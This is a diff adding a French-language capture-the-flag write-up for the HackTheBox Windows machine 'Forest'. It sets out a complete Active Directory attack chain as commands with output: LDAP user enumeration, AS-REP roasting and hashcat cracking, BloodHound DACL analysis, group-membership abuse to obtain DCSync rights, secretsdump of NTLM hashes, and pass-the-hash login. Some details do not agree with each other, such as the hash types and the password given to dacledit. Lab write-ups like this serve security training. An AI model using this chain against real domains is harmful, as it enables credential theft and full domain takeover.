@@ -1,0 +1,225 @@
+---
+title: Forest
+tableOfContents: false
+---
+
+import { Aside } from '@astrojs/starlight/components';
+
+
+<center>
+    <img src="forest.png" width="150px"/>
+</center>
+
+
+Forest est une box Windows de niveau facile de HackTheBox. Nous allons dans cette box exploiter un service mal configuré pour obtenir un premier accès, puis exploiter des privilèges trop permissifs pour compromettre le compte administrateur.
+## Reconnaissance
+
+On commence par une première énumération des services disponibles sur la machine.
+
+## Port Enumeration
+
+```bash
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-21 15:47:58Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49681/tcp open  msrpc        Microsoft Windows RPC
+49685/tcp open  msrpc        Microsoft Windows RPC
+49700/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+
+
+Cette énumération nous montre que nous avons affaire à une machine windows, très certainement un contrôleur de domaine car nous voyons la présence d'un KDC, d'un LDAP, et d'autres services Windows.
+
+## LDAP Enum
+
+En requêtant le LDAP, on s'aperçoit qu'on peut énumérer celui-ci sans avoir besoin d'authentification. Nous allons donc lister les utilisateurs : 
+
+
+```bash
+ldapsearch -x -H ldap://forest.htb.local -b "dc=htb,dc=local" '(objectClass=person)' | tee ldapDumpPerson
+
+$331000-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+SM_681f53d4942840e18
+SM_1b41c9286325456bb
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailbox83d6781
+HealthMailboxfd87238
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+Administrator
+Guest
+krbtgt
+DefaultAccount
+```
+
+## Kerbrute User-enum
+
+<Aside type="tip">
+### Pré-authentification Kerberos & AS-REP Roasting
+
+Si un compte est configuré pour ne pas avoir de pré-authentification, il est possible pour un attaquant de demander un ticket TGT pour cet utilisateur. Dans ce cas le ticket sera chiffré avec le mot de passe de l'utilisateur. 
+Avec le ticket, un attaquant peut donc essayer de cracker le mot de passe hors-ligne. Cette attaque s'appelle AS-REP Roasting.
+</Aside>
+
+Une fois notre liste d'utilisateurs obtenue, nous allons la valider avec Kerbrute pour voir si un des comptes est attaquable. Si la pré-authentification est désactivée, kerbrute extrait automatiquement le ticket pour le cracker hors-ligne.
+
+```bash
+kerbrute userenum users.list -d htb.local --dc forest.htb.local | tee kerbrute-userenum
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 06/21/26 - Ronnie Flathers @ropnop
+
+2026/06/21 12:14:43 >  Using KDC(s):
+2026/06/21 12:14:43 >  	forest.htb.local:88
+
+2026/06/21 12:14:43 >  [+] VALID USERNAME:	 andy@htb.local
+2026/06/21 12:14:43 >  [+] VALID USERNAME:	 Administrator@htb.local
+2026/06/21 12:14:43 >  [+] VALID USERNAME:	 lucinda@htb.local
+2026/06/21 12:14:43 >  [+] VALID USERNAME:	 sebastien@htb.local
+2026/06/21 12:14:43 >  [+] VALID USERNAME:	 santi@htb.local
+2026/06/21 12:14:43 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc-alfresco@HTB.LOCAL:f7607d4503f7a1e3b385a88514a04c98$08491439322618d28adb43c6d9dd74c1438064ffb14ca68f371226659f3de5ceef073c5e25ed105983f8b299123ec46815a7b247f1a4650a4a2c3ca3a4215a48611ed50ca539a6dd0f47a17fddb31636aba8049422e890f52ad12f7ed1e1d90b0c207ea00e3686ae9fca5a8d7275ee989ce3e0a17fef2cf59c8aa6ad9ae1ca0726b58f46eb01fa53743b147ab306877dbd66a386338e86f07b4bf06965c460e48305e8e793db1db870e97f122dcdbbac3179f6e13fb4074b417002ddefaee23c5327c60dcde76db97109a6dc61363fec6fffb7762585cd12de36051ff3340ae6650e3b21975c58218b05b0aba6c1a490f0247d955f879f57d9e8
+2026/06/21 12:14:43 >  [+] VALID USERNAME:	 svc-alfresco@htb.local
+2026/06/21 12:14:43 >  [+] VALID USERNAME:	 mark@htb.local
+2026/06/21 12:14:43 >  Done! Tested 9 usernames (7 valid) in 0.068 seconds
+
+```
+
+### Hashcat
+
+On peut alors cracker directement le ticket et récupérer le mot de passe de l'utilisateur.
+
+```bash
+hashcat -a 0 -m 18200 hash /usr/share/wordlist/rockyou.txt 
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:90a27ff0dc87d86d1bae2dcb96406a65$c5717a40cbdb24d4684048b12c2910a2e51bb68310b1292bf65283679a4fea9518c82d25c681d134d0013587e03fe05f40d9893fd6667d6205f206a113bc6d6d459acdd5b840267f32ab2fc7d5de313f173ebc68cc31beced5ac58ccd5108bbb686021049e5a7bc21dad1bbdaa8cb1d52a052b98633a22e02fff915c2c1f52dd8419eee24d7fdb59dcc7dd2a31104cb8ceae3a805d6492f8e666d7856361b5f0466657f51e1e2e2c712f6e76a4bafd1a212ccd0fb382cac67274695f3731c7889ac19a1a9bcba907806e50b732b3dd683274e115d155741efca1883c61cfe14c55857ba483f4:s3rvice
+```
+
+# Foothold
+
+On réutilise les identifiants de l'utilisateur svc-alfresco pour se connecter et récupérer le premier flag.
+
+## WinRM
+
+```bash
+sudo nxc winrm forest.htb.local -u svc-alfresco -p s3rvice
+WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
+WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+
+```
+
+## Enumerate DACL
+
+<Aside type="note">
+On a besoin de configurer /etc/resolv.conf sur forest.htb.local. cela permet aux collecteurs BloodHound de faire la résolution DNS appropriée. 
+</Aside>
+
+On va utiliser BloodHound python pour énumérer correctement le domaine et essayer de trouver un vecteur d'escalade.
+
+```bash
+bloodhound-python -d htb.local -u svc-alfresco -p s3rvice --zip --collection all
+```
+
+# Escalade de privilège
+
+Après analyse des données de BloodHound, on peut observer plusieurs points :
+
+## Exchange can WriteDACL le domaine
+
+On voit dans BloodHound que le groupe "Exchange Windows Permissions" peut écrire le domaine HTB.LOCAL.
+
+<img src="writedacl.png"/>
+
+## AccountOperators peuvent écrire le groupe Exchange
+
+On voit aussi que notre utilisateur svc-alfresco est membre de service account, qui est membre de Privileged IT Account, qui est membre de Account Operator. Donc indirectement, notre utilisateur est membre de Account Operator. Or, ce groupe a les droits d'écriture sur le groupe "Exchange Windows Permission". Cela veut dire que l'on peut ajouter notre utilisateur (en utilisant ses identifiants) au groupe ciblé.
+
+<img src="genericall.png"/>
+
+### Ajout de svc-alfresco au groupe "Exchange Windows Permissions"
+
+Nous allons donc ajouter notre utilisateur au groupe "Exchange Windows Permissions" :
+
+```powershell
+Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members "svc-alfresco" -Credential $Cred -Verbose
+Verbose: [Get-PrincipalContext] Using alternate credentials
+Verbose: [Add-DomainGroupMember] Adding member 'svc-alfresco' to group 'Exchange Windows Permissions'
+
+```
+
+### Écriture d’un nouveau DACL pour obtenir les droits DCSync
+
+En suite, nous n'avons pas encore tous les droits sur le domaine. Nous allons simplement écrire un nouveau DACL pour nous donner les droits de faire un DCSync et ainsi récupérer le hash du mot de passe de l'administrateur pour avoir les privilèges systèmes sur la machine FOREST :
+
+```bash
+dacledit.py -action write -rights DCSync -principal svc-alfresco -target-dn "DC=htb,DC=local" htb.local/svc-alfresco:svc-alfresco
+
+```
+
+### DCSync & Pass the Hash
+
+Une fois le DACL créé, on peut exécuter notre DCSync : 
+
+```bash
+secretsdump.py htb.local/svc-alfresco:s3rvice@10.129.95.210 -just-dc
+Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+```
+
+et Enfin, nous connecter en tant qu'Administrator via une attaque Pass The Hash.
+
+```bash
+evil-winrm -i htb.local -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+```
